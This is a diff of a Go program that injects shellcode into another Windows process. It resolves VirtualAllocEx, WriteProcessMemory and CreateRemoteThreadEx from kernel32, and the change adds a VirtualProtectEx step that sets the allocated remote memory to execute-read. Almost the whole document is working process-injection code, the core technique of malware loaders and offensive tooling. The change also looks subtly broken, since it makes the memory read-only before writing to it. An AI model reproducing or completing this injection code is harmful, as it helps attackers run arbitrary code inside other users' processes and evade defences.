@@ -73,10 +73,8 @@ func main() {
 	fmt.Printf("Handle received on process {%v}: %v\n", pid32, hProcess)
 
 	kernel32dll := windows.NewLazyDLL("kernel32.dll")
-	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
-	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
-	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")
 
+	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
 	rAddr, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
 		uintptr(0),
 		uintptr(len(sc)),
@@ -89,7 +87,23 @@ func main() {
 
 	// TO-DO change permission using virtaulProtect
 	// PAGE_READWRITE -> PAGE_EXCUTE_READ
+
+	pVirtualProtectEx := kernel32dll.NewProc("VirtualProtectEx")
+	var oldProt uint32
+	rProt, _, errP := pVirtualProtectEx.Call(uintptr(hProcess),
+		uintptr(rAddr),
+		uintptr(len(sc)),
+		uintptr(windows.PAGE_EXECUTE_READ),
+		uintptr(unsafe.Pointer(&oldProt)),
+	)
+	if rProt == 0 {
+		fmt.Printf("VirtualProtect failed: %v", errP)
+		os.Exit(1)
+	}
+	fmt.Printf("Memory protection shifted to RX successfully. Old protect: 0x%x\n", oldProt)
+
 	/* write to buffer using NewProc */
+	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
 	var bytesWritten uintptr
 	rWrite, _, errW := pWriteProcessMemory.Call(
 		uintptr(hProcess),
@@ -104,6 +118,7 @@ func main() {
 	}
 
 	/* creating remote threads */
+	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")
 	var tid uint32
 	hThread, _, errT := pCreateRemoteThreadEx.Call(uintptr(hProcess),
 		uintptr(0),
